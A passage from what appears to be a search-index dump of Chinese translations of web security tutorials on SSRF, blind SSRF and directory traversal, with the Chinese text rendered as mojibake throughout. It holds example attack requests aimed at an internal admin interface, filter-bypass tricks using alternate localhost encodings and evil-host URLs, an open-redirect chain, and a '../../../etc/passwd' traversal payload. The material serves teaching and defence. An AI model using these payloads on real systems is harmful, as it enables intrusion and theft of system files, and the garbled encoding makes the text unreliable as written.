æ­¤æ—¶ï¼ŒæœåŠ¡ç«¯å°†ä¼šè®¿é—®æœ¬åœ° /admin URL å¹¶å°†å…¶å†…å®¹è¿”å›ç»™ç”¨æˆ·ã€‚ å½“ç„¶ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥è®¿é—® /admin URL ï¼Œä½†æ˜¯è¿™é€šå¸¸æ²¡ç”¨ï¼Œå› ä¸ºç®¡ç†åŠŸèƒ½åŸºæœ¬éƒ½éœ€è¦è¿›è¡Œé€‚å½“çš„èº«ä»½éªŒè¯ï¼Œè€Œå¦‚æœå¯¹ /admin URL çš„è¯·æ±‚æ¥è‡ªæœºå™¨æœ¬åœ°ï¼Œåˆ™æ­£å¸¸æƒ…å†µä¸‹çš„è®¿é—®æ§åˆ¶å¯èƒ½ä¼šè¢«ç»•è¿‡ã€‚è¯¥æœåŠ¡ç«¯åº”ç”¨ç¨‹åºå¯èƒ½ä¼šæˆäºˆå¯¹ç®¡ç†åŠŸèƒ½çš„å®Œå…¨è®¿é—®æƒé™ï¼Œå› ä¸ºè¯·æ±‚ä¼¼ä¹æ¥è‡ªå—ä¿¡ä»»çš„ä½ç½®ã€‚ ä¸ºä»€ä¹ˆåº”ç”¨ç¨‹åºä¼šä»¥è¿™ç§æ–¹å¼è¿è¡Œï¼Œå¹¶ä¸”éšå¼ä¿¡ä»»æ¥è‡ªæœ¬åœ°çš„è¯·æ±‚ï¼Ÿè¿™å¯èƒ½æœ‰å¤šç§åŸå› ï¼š è®¿é—®æ§åˆ¶æ£€æŸ¥å¯èƒ½æ˜¯å¦å¤–çš„ä¸€ä¸ªå¾®æœåŠ¡ã€‚å½“æœåŠ¡å™¨è¿æ¥è‡ªèº«æ—¶ï¼Œå°†ä¼šç»•è¿‡è®¿é—®æ§åˆ¶æ£€æŸ¥ã€‚ å‡ºäºç¾éš¾æ¢å¤çš„ç›®çš„ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å…è®¸æ¥è‡ªæœ¬åœ°æœºå™¨çš„ä»»ä½•ç”¨æˆ·åœ¨ä¸ç™»å½•çš„æƒ…å†µä¸‹è¿›è¡Œç®¡ç†è®¿é—®ã€‚è¿™ä¸ºç®¡ç†å‘˜åœ¨ä¸¢å¤±å‡­è¯æ—¶æ¢å¤ç³»ç»Ÿæä¾›äº†ä¸€ç§æ–¹æ³•ã€‚è¿™é‡Œçš„å‡è®¾æ˜¯åªæœ‰å®Œå…¨å¯ä¿¡çš„ç”¨æˆ·æ‰èƒ½ç›´æ¥æ¥è‡ªæœåŠ¡å™¨æœ¬åœ°ã€‚ ç®¡ç†æ¥å£å¯èƒ½ä¸ä¸»åº”ç”¨æ˜¯ä¸åŒçš„ç«¯å£å·ï¼Œå› ä¸ºç”¨æˆ·å¯èƒ½æ— æ³•ç›´æ¥è®¿é—®ã€‚ åœ¨è¿™ç§ä¿¡ä»»å…³ç³»ä¸­ï¼Œæ¥è‡ªæœ¬åœ°æœºå™¨çš„è¯·æ±‚çš„å¤„ç†æ–¹å¼ä¸æ™®é€šè¯·æ±‚ä¸åŒï¼Œè¿™å¸¸å¸¸ä½¿ SSRF æˆä¸ºä¸€ä¸ªä¸¥é‡çš„æ¼æ´ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:3:1","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"é’ˆå¯¹å…¶ä»–åç«¯ç³»ç»Ÿçš„ SSRF æ”»å‡» SSRF åˆ©ç”¨çš„å¦å¤–ä¸€ç§ä¿¡ä»»å…³ç³»æ˜¯åº”ç”¨æœåŠ¡ç«¯ä¸ç”¨æˆ·æ— æ³•ç›´æ¥è®¿é—®çš„å†…éƒ¨åç«¯ç³»ç»Ÿä¹‹é—´è¿›è¡Œçš„äº¤äº’ï¼Œè¿™äº›åç«¯ç³»ç»Ÿé€šå¸¸å…·æœ‰ä¸å¯è·¯ç”±çš„ä¸“ç”¨ IP åœ°å€ï¼Œç”±äºå—åˆ°ç½‘ç»œæ‹“æ‰‘ç»“æ„çš„ä¿æŠ¤ï¼Œå®ƒä»¬çš„å®‰å…¨æ€§å¾€å¾€è¾ƒå¼±ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œå†…éƒ¨åç«¯ç³»ç»ŸåŒ…å«ä¸€äº›æ•æ„ŸåŠŸèƒ½ï¼Œä»»ä½•èƒ½å¤Ÿä¸ç³»ç»Ÿäº¤äº’çš„äººéƒ½å¯ä»¥åœ¨ä¸è¿›è¡Œèº«ä»½éªŒè¯çš„æƒ…å†µä¸‹è®¿é—®è¿™äº›åŠŸèƒ½ã€‚ åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå‡è®¾åç«¯ç³»ç»Ÿæœ‰ä¸€ä¸ªç®¡ç†æ¥å£ https://192.168.0.68/admin ã€‚æ­¤æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤ä»¥ä¸‹è¯·æ±‚åˆ©ç”¨ SSRF æ¼æ´è®¿é—®ç®¡ç†æ¥å£ï¼š POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://192.168.0.68/admin ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:3:2","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"è§„é¿å¸¸è§çš„ SSRF é˜²å¾¡ é€šå¸¸åº”ç”¨ç¨‹åºåŒ…å« SSRF è¡Œä¸ºä»¥åŠé˜²æ­¢æ¶æ„æ”»å‡»çš„é˜²å¾¡æªæ–½ï¼Œç„¶è€Œè¿™äº›é˜²å¾¡æªæ–½æ˜¯å¯ä»¥è¢«è§„é¿çš„ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"åŸºäºé»‘åå•è¿‡æ»¤çš„ SSRF æŸäº›åº”ç”¨ç¨‹åºç¦æ­¢ä¾‹å¦‚ 127.0.0.1ã€localhost ç­‰ä¸»æœºåã€æˆ– /admin ç­‰æ•æ„Ÿ URL ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨å„ç§æŠ€å·§ç»•è¿‡è¿‡æ»¤ï¼š ä½¿ç”¨ 127.0.0.1 çš„æ›¿ä»£ IP åœ°å€è¡¨ç¤ºï¼Œä¾‹å¦‚ 2130706433ï¼Œ017700000001ï¼Œ127.1 ã€‚ æ³¨å†Œè‡ªå·±çš„åŸŸåï¼Œå¹¶è§£æä¸º 127.0.0.1 ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨ spoofed.burpcollaborator.net ã€‚ ä½¿ç”¨ URL ç¼–ç æˆ–å¤§å°å†™å˜åŒ–æ¥æ··æ·†è¢«é˜»æ­¢çš„å­—ç¬¦ä¸²ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:4:1","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"åŸºäºç™½åå•è¿‡æ»¤çš„ SSRF æœ‰äº›åº”ç”¨ç¨‹åºåªå…è®¸è¾“å…¥åŒ¹é…ã€æˆ–åŒ…å«ç™½åå•ä¸­çš„å€¼ï¼Œæˆ–ä»¥ç™½åå•ä¸­çš„å€¼å¼€å¤´ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰æ—¶å¯ä»¥åˆ©ç”¨ URL è§£æçš„ä¸ä¸€è‡´æ¥ç»•è¿‡è¿‡æ»¤å™¨ã€‚ URL è§„èŒƒåŒ…å«æœ‰è®¸å¤šåœ¨å®ç° URL çš„è§£æå’ŒéªŒè¯æ—¶å®¹æ˜“è¢«å¿½ç•¥çš„ç‰¹æ€§ï¼š ä½ å¯ä»¥åœ¨ä¸»æœºåä¹‹å‰ä½¿ç”¨ @ ç¬¦å·åµŒå…¥å‡­è¯ã€‚ä¾‹å¦‚ https://expected-host@evil-host ã€‚ ä½ å¯ä»¥ä½¿ç”¨ # ç¬¦å·è¡¨ç¤ºä¸€ä¸ª URL ç‰‡æ®µã€‚ä¾‹å¦‚ https://evil-host#expected-host ã€‚ ä½ å¯ä»¥åˆ©ç”¨ DNS å‘½ä»¤å±‚æ¬¡ç»“æ„å°†æ‰€éœ€çš„è¾“å…¥æ”¾å…¥ä½ æ§åˆ¶çš„æ ‡å‡† DNS åç§°ä¸­ã€‚ä¾‹å¦‚ https://expected-host.evil-host ã€‚ ä½ å¯ä»¥ä½¿ç”¨ URL ç¼–ç å­—ç¬¦æ¥è¿·æƒ‘ URL è§£æä»£ç ã€‚å¦‚æœå¤„ç† URL ç¼–ç çš„è¿‡æ»¤å™¨çš„å®ç°ä¸åŒä¸æ‰§è¡Œåç«¯ HTTP è¯·æ±‚çš„ä»£ç ï¼Œè¿™ä¸€ç‚¹å°¤å…¶æœ‰ç”¨ã€‚ ä½ å¯ä»¥æŠŠè¿™äº›æŠ€å·§ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:4:2","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡ SSRF è¿‡æ»¤å™¨ æœ‰æ—¶åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´å¯ä»¥ç»•è¿‡ä»»ä½•åŸºäºè¿‡æ»¤å™¨çš„é˜²å¾¡ã€‚ åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå‡è®¾ç”¨æˆ·æäº¤çš„ URL ç»è¿‡ä¸¥æ ¼éªŒè¯ï¼Œä»¥é˜²æ­¢æ¶æ„åˆ©ç”¨ SSRF çš„è¡Œä¸ºï¼Œä½†æ˜¯ï¼Œå…è®¸ä½¿ç”¨ URL çš„åº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå¼€æ”¾é‡å®šå‘æ¼æ´ã€‚å¦‚æœç”¨äºå‘èµ·åç«¯ HTTP è¯·æ±‚çš„ API æ”¯æŒé‡å®šå‘ï¼Œé‚£ä¹ˆä½ å¯ä»¥æ„é€ ä¸€ä¸ªæ»¡è¶³è¿‡æ»¤å™¨çš„è¦æ±‚çš„ URL ï¼Œå¹¶å°†è¯·æ±‚é‡å®šå‘åˆ°æ‰€éœ€çš„åç«¯ç›®æ ‡ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œä¾‹å¦‚ä¸‹é¢ URL çš„å½¢å¼ï¼š /product/nextProduct?currentProductId=6\u0026path=http://evil-user.net é‡å®šå‘åˆ°ï¼š http://evil-user.net ä½ å¯ä»¥åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´ç»•è¿‡ URL è¿‡æ»¤å™¨ï¼Œå¹¶åˆ©ç”¨ SSRF æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œå¦‚ï¼š POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6\u0026path=http://192.168.0.68/admin è¿™ä¸ª SSRF æ”»å‡»ä¹‹æ‰€æœ‰æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºé¦–å…ˆ stockAPI URL åœ¨åº”ç”¨ç¨‹åºå…è®¸çš„åŸŸä¸Šï¼Œç„¶ååº”ç”¨ç¨‹åºå‘æä¾›çš„ URL å‘èµ·è¯·æ±‚ï¼Œè§¦å‘äº†é‡å®šå‘ï¼Œæœ€ç»ˆå‘é‡å®šå‘çš„å†…éƒ¨ URL å‘èµ·äº†è¯·æ±‚ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:4:3","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"Blind SSRF - ä¸å¯è§ SSRF æ¼æ´ æ‰€è°“ Blind SSRFï¼ˆä¸å¯è§ SSRFï¼‰æ¼æ´æ˜¯æŒ‡ï¼Œå¯ä»¥è¯±å¯¼åº”ç”¨ç¨‹åºå‘æä¾›çš„ URL å‘èµ·åç«¯ HTTP è¯·æ±‚ï¼Œä½†æ˜¯è¯·æ±‚çš„å“åº”å¹¶æ²¡æœ‰åœ¨åº”ç”¨ç¨‹åºçš„å‰ç«¯å“åº”ä¸­è¿”å›ã€‚ ä¸å¯è§ SSRF æ¼æ´é€šå¸¸è¾ƒéš¾åˆ©ç”¨ï¼Œä½†æœ‰æ—¶ä¼šå¯¼è‡´æœåŠ¡å™¨æˆ–å…¶ä»–åç«¯ç»„ä»¶ä¸Šçš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:5:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"å¯»æ‰¾ SSRF æ¼æ´çš„éšè—æ”»å‡»é¢ è®¸å¤š SSRF æ¼æ´ä¹‹æ‰€ä»¥ç›¸å¯¹å®¹æ˜“å‘ç°ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç¨‹åºçš„æ­£å¸¸é€šä¿¡ä¸­å°±åŒ…å«äº†å®Œæ•´çš„ URL è¯·æ±‚å‚æ•°ã€‚è€Œå…¶å®ƒæƒ…å†µå°±æ¯”è¾ƒéš¾æäº†ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:6:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"è¯·æ±‚ä¸­çš„éƒ¨åˆ† URL æœ‰æ—¶åº”ç”¨ç¨‹åºåªå°†ä¸»æœºåæˆ– URL è·¯å¾„çš„ä¸€éƒ¨åˆ†æ”¾å…¥è¯·æ±‚å‚æ•°ä¸­ï¼Œç„¶åï¼Œæäº¤çš„å€¼è¢«åˆå¹¶åˆ°æœåŠ¡ç«¯è¯·æ±‚çš„å®Œæ•´ URL ä¸­ã€‚å¦‚æœè¯¥å€¼å¾ˆå®¹æ˜“è¢«è¯†åˆ«ä¸ºä¸»æœºåæˆ– URL è·¯å¾„ï¼Œé‚£ä¹ˆæ½œåœ¨çš„æ”»å‡»é¢å¯èƒ½å¾ˆæ˜æ˜¾ã€‚ä½†æ˜¯ï¼Œå› ä¸ºä½ ä¸èƒ½æ§åˆ¶æœ€ç»ˆè¯·æ±‚çš„ URLï¼Œæ‰€ä»¥ SSRF çš„å¯åˆ©ç”¨æ€§ä¼šå—åˆ°é™åˆ¶ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:6:1","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"æ•°æ®æ ¼å¼å†…çš„ URL æœ‰äº›åº”ç”¨ç¨‹åºä»¥æŸç§æ•°æ®æ ¼å¼ä¼ è¾“æ•°æ®ï¼ŒURL åˆ™åŒ…å«åœ¨æŒ‡å®šæ•°æ®æ ¼å¼ä¸­ã€‚è¿™é‡Œçš„æ•°æ®æ ¼å¼çš„ä¸€ä¸ªæ˜æ˜¾çš„ä¾‹å­å°±æ˜¯ XML ï¼Œå½“åº”ç”¨ç¨‹åºæ¥å— XML æ ¼å¼çš„æ•°æ®å¹¶å¯¹å…¶è¿›è¡Œè§£ææ—¶ï¼Œå¯èƒ½ä¼šå—åˆ° XXE æ³¨å…¥ï¼Œè¿›è€Œé€šè¿‡ XXE å®Œæˆ SSRF æ”»å‡»ã€‚æœ‰å…³ XXE æ³¨å…¥æ¼æ´ä¼šæœ‰ä¸“é—¨çš„ç« èŠ‚è®²è§£ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:6:2","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"é€šè¿‡ Referer å¤´çš„ SSRF ä¸€äº›åº”ç”¨ç¨‹åºä½¿ç”¨æœåŠ¡ç«¯åˆ†æè½¯ä»¶æ¥è·Ÿè¸ªè®¿é—®è€…ï¼Œè¿™ç§è½¯ä»¶ç»å¸¸åœ¨è¯·æ±‚ä¸­è®°å½• Referer å¤´ï¼Œå› ä¸ºè¿™å¯¹äºè·Ÿè¸ªä¼ å…¥é“¾æ¥ç‰¹åˆ«æœ‰ç”¨ã€‚é€šå¸¸ï¼Œåˆ†æè½¯ä»¶å®é™…ä¸Šä¼šè®¿é—® Referer å¤´ä¸­å‡ºç°çš„ä»»ä½•ç¬¬ä¸‰æ–¹ URL ã€‚è¿™é€šå¸¸ç”¨äºåˆ†æå¼•ç”¨ç«™ç‚¹çš„å†…å®¹ï¼ŒåŒ…æ‹¬ä¼ å…¥é“¾æ¥ä¸­ä½¿ç”¨çš„é”šæ–‡æœ¬ã€‚å› æ­¤ï¼ŒReferer å¤´é€šå¸¸æ˜¯ SSRF æ¼æ´çš„æœ‰æ•ˆæ”»å‡»é¢ã€‚æœ‰å…³æ¶‰åŠ Referer å¤´çš„æ¼æ´ç¤ºä¾‹è¯·å‚é˜… Blind SSRF ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:6:3","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"Blind SSRF","date":"2021-03-01","objectID":"/translation/web-security/ssrf/blind-ssrf/","tags":[],"title":"Blind SSRF","uri":"/translation/web-security/ssrf/blind-ssrf/"},{"categories":["web security"],"content":"Blind SSRF åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯ä¸å¯è§çš„æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œå¹¶æè¿°ä¸€äº›å¸¸è§çš„ä¸å¯è§ SSRF ç¤ºä¾‹ï¼Œä»¥åŠè§£é‡Šå¦‚ä½•å‘ç°å’Œåˆ©ç”¨ä¸å¯è§ SSRF æ¼æ´ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/blind-ssrf/:0:0","tags":[],"title":"Blind SSRF","uri":"/translation/web-security/ssrf/blind-ssrf/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ä¸å¯è§ SSRF ä¸å¯è§ SSRF æ¼æ´æ˜¯æŒ‡ï¼Œå¯ä»¥è¯±å¯¼åº”ç”¨ç¨‹åºå‘æä¾›çš„ URL å‘å‡ºåç«¯ HTTP è¯·æ±‚ï¼Œä½†æ¥è‡ªåç«¯è¯·æ±‚çš„å“åº”æ²¡æœ‰åœ¨åº”ç”¨ç¨‹åºçš„å‰ç«¯å“åº”ä¸­è¿”å›ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/blind-ssrf/:1:0","tags":[],"title":"Blind SSRF","uri":"/translation/web-security/ssrf/blind-ssrf/"},{"categories":["web security"],"content":"ä¸å¯è§ SSRF æ¼æ´çš„å½±å“ ä¸å¯è§ SSRF æ¼æ´çš„å½±å“å¾€å¾€ä½äºå®Œå…¨å¯è§çš„ SSRF æ¼æ´ï¼Œå› ä¸ºå…¶å•å‘æ€§ï¼Œè™½ç„¶åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨å®ƒä»¬ä»åç«¯ç³»ç»Ÿæ£€ç´¢æ•æ„Ÿæ•°æ®ï¼Œä½†ä¸èƒ½è½»æ˜“åœ°åˆ©ç”¨å®ƒä»¬æ¥å®ç°å®Œæ•´çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/blind-ssrf/:2:0","tags":[],"title":"Blind SSRF","uri":"/translation/web-security/ssrf/blind-ssrf/"},{"categories":["web security"],"content":"å¦‚ä½•å‘ç°å’Œåˆ©ç”¨ä¸å¯è§ SSRF æ¼æ´ æ£€æµ‹ä¸å¯è§ SSRF æ¼æ´æœ€å¯é çš„æ–¹æ³•æ˜¯ä½¿ç”¨ out-of-bandï¼ˆOASTï¼‰å¸¦å¤–æŠ€æœ¯ã€‚è¿™åŒ…æ‹¬å°è¯•è§¦å‘å¯¹ä½ æ§åˆ¶çš„å¤–éƒ¨ç³»ç»Ÿçš„ HTTP è¯·æ±‚ï¼Œå¹¶ç›‘è§†ä¸è¯¥ç³»ç»Ÿçš„ç½‘ç»œäº¤äº’ã€‚ ä½¿ç”¨ OAST æŠ€æœ¯æœ€ç®€å•æœ‰æ•ˆçš„æ–¹å¼æ˜¯ä½¿ç”¨ Burp Collaborator (ä»˜è´¹è½¯ä»¶)ã€‚ä½ å¯ä»¥ä½¿ç”¨ Burp Collaborator client ç”Ÿæˆå”¯ä¸€çš„åŸŸåï¼Œå°†è¿™ä¸ªåŸŸåä»¥æœ‰æ•ˆè´Ÿè½½çš„å½¢å¼å‘é€åˆ°æ£€æµ‹æ¼æ´çš„åº”ç”¨ç¨‹åºï¼Œå¹¶ç›‘è§†ä¸è¿™ä¸ªåŸŸåçš„ä»»ä½•äº¤äº’ï¼Œå¦‚æœè§‚å¯Ÿåˆ°æ¥è‡ªåº”ç”¨ç¨‹åºä¼ å…¥çš„ HTTP è¯·æ±‚ï¼Œåˆ™è¯´æ˜åº”ç”¨ç¨‹åºå­˜åœ¨ SSRF æ¼æ´ã€‚ æ³¨æ„ï¼šåœ¨æµ‹è¯• SSRF æ¼æ´æ—¶ï¼Œé€šå¸¸ä¼šè§‚å¯Ÿåˆ°æ‰€æä¾›åŸŸåçš„ DNS æŸ¥æ‰¾ï¼Œä½†æ˜¯å´æ²¡æœ‰åç»­çš„ HTTP è¯·æ±‚ã€‚è¿™é€šå¸¸æ˜¯åº”ç”¨ç¨‹åºè§†å›¾å‘è¯¥åŸŸåå‘å‡º HTTP è¯·æ±‚ï¼Œè¿™å¯¼è‡´äº†åˆå§‹çš„ DNS æŸ¥æ‰¾ï¼Œä½†å®é™…çš„ HTTP è¯·æ±‚è¢«ç½‘ç»œæ‹¦æˆªäº†ã€‚åŸºç¡€è®¾æ–½å…è®¸å‡ºç«™çš„ DNS æµé‡æ˜¯ç›¸å¯¹å¸¸è§çš„ï¼Œå› ä¸ºå‡ºäºå¾ˆå¤šç›®çš„éœ€è¦ï¼Œä½†æ˜¯ä¼šé˜»æ­¢åˆ°æ„å¤–ç›®çš„åœ°çš„ HTTP è¿æ¥ã€‚ ç®€å•åœ°è¯†åˆ«ä¸€ä¸ªå¯ä»¥è§¦å‘ out-of-band å¸¦å¤– HTTP è¯·æ±‚çš„ä¸å¯è§ SSRF æ¼æ´æœ¬èº«å¹¶æ²¡æœ‰æä¾›ä¸€ä¸ªå¯åˆ©ç”¨çš„é€”å¾„ã€‚ç”±äºä½ æ— æ³•æŸ¥çœ‹æ¥è‡ªåç«¯è¯·æ±‚çš„å“åº”ï¼Œå› æ­¤ä¹Ÿæ— æ³•å¾—çŸ¥å…·ä½“çš„å†…å®¹ã€‚ä½†æ˜¯ï¼Œå®ƒä»ç„¶å¯ä»¥ç”¨æ¥æ¢æµ‹æœåŠ¡å™¨æœ¬èº«æˆ–å…¶ä»–åç«¯ç³»ç»Ÿä¸Šçš„å…¶ä»–æ¼æ´ã€‚ä½ å¯ä»¥ç›²ç›®åœ°æ‰«æå†…éƒ¨ IP åœ°å€ç©ºé—´ï¼Œå‘é€æ—¨åœ¨æ£€æµ‹å·²çŸ¥æ¼æ´çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¦‚æœè¿™äº›æœ‰æ•ˆè´Ÿè½½ä¹Ÿä½¿ç”¨å¸¦å¤–æŠ€æœ¯ï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½ä¼šå‘ç°å†…éƒ¨æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªæœªä¿®è¡¥çš„ä¸¥é‡æ¼æ´ã€‚ å¦ä¸€ç§åˆ©ç”¨ä¸å¯è§ SSRF æ¼æ´çš„æ–¹æ³•æ˜¯è¯±å¯¼åº”ç”¨ç¨‹åºè¿æ¥åˆ°æ”»å‡»è€…æ§åˆ¶ä¸‹çš„ç³»ç»Ÿï¼Œå¹¶å°†æ¶æ„å“åº”è¿”å›åˆ°è¿›è¡Œè¿æ¥çš„ HTTP å®¢æˆ·ç«¯ã€‚å¦‚æœä½ å¯ä»¥åˆ©ç”¨æœåŠ¡ç«¯ HTTP å®ç°ä¸­çš„ä¸¥é‡çš„å®¢æˆ·ç«¯æ¼æ´ï¼Œé‚£ä¹ˆä½ ä¹Ÿè®¸èƒ½å¤Ÿåœ¨åº”ç”¨ç¨‹åºåŸºç¡€æ¶æ„ä¸­è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/blind-ssrf/:3:0","tags":[],"title":"Blind SSRF","uri":"/translation/web-security/ssrf/blind-ssrf/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ Directory traversal","date":"2021-03-01","objectID":"/translation/web-security/directory-traversal/directory-traversal/","tags":[],"title":"web å®‰å…¨ä¹‹ Directory traversal","uri":"/translation/web-security/directory-traversal/directory-traversal/"},{"categories":["web security"],"content":"Directory traversal - ç›®å½•éå† åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä»€ä¹ˆæ˜¯ç›®å½•éå†ï¼Œæè¿°å¦‚ä½•æ‰§è¡Œè·¯å¾„éå†æ”»å‡»å’Œç»•è¿‡å¸¸è§éšœç¢ï¼Œå¹¶é˜æ˜å¦‚ä½•é˜²æ­¢è·¯å¾„éå†æ¼æ´ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/directory-traversal/directory-traversal/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ Directory traversal","uri":"/translation/web-security/directory-traversal/directory-traversal/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ç›®å½•éå†ï¼Ÿ ç›®å½•éå†ï¼ˆä¹Ÿç§°ä¸ºæ–‡ä»¶è·¯å¾„éå†ï¼‰æ˜¯ä¸€ä¸ª web å®‰å…¨æ¼æ´ï¼Œæ­¤æ¼æ´ä½¿æ”»å‡»è€…èƒ½å¤Ÿè¯»å–è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚è¿™å¯èƒ½åŒ…æ‹¬åº”ç”¨ç¨‹åºä»£ç å’Œæ•°æ®ã€åç«¯ç³»ç»Ÿçš„å‡­æ®ä»¥åŠæ“ä½œç³»ç»Ÿç›¸å…³æ•æ„Ÿæ–‡ä»¶ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå¯¹æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶è¿›è¡Œå†™å…¥ï¼Œä»è€Œå…è®¸ä»–ä»¬ä¿®æ”¹åº”ç”¨ç¨‹åºæ•°æ®æˆ–è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/directory-traversal/directory-traversal/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ Directory traversal","uri":"/translation/web-security/directory-traversal/directory-traversal/"},{"categories":["web security"],"content":"é€šè¿‡ç›®å½•éå†è¯»å–ä»»æ„æ–‡ä»¶ å‡è®¾æŸä¸ªåº”ç”¨ç¨‹åºé€šè¿‡å¦‚ä¸‹ HTML åŠ è½½å›¾åƒï¼š \u003cimg src=\"/loadImage?filename=218.png\"\u003e è¿™ä¸ª loadImage URL é€šè¿‡ filename æ–‡ä»¶åå‚æ•°æ¥è¿”å›æŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼Œå‡è®¾å›¾åƒæœ¬èº«å­˜å‚¨åœ¨è·¯å¾„ä¸º /var/www/images/ çš„ç£ç›˜ä¸Šã€‚åº”ç”¨ç¨‹åºåŸºäºæ­¤åŸºå‡†è·¯å¾„ä¸è¯·æ±‚çš„ filename æ–‡ä»¶åè¿”å›å¦‚ä¸‹è·¯å¾„çš„å›¾åƒï¼š /var/www/images/218.png å¦‚æœè¯¥åº”ç”¨ç¨‹åºæ²¡æœ‰é’ˆå¯¹ç›®å½•éå†æ”»å‡»é‡‡å–ä»»ä½•é˜²å¾¡æªæ–½ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥è¯·æ±‚ç±»ä¼¼å¦‚ä¸‹ URL ä»æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸­æ£€ç´¢ä»»æ„æ–‡ä»¶ï¼š https://insecure-website.com/loadImage?filename=../../../etc/passwd è¿™å°†å¯¼è‡´å¦‚ä¸‹è·¯å¾„çš„æ–‡ä»¶è¢«è¿”å›ï¼š /var/www/images/../../../etc/passwd ../ è¡¨ç¤ºä¸Šçº§ç›®å½•ï¼Œå› 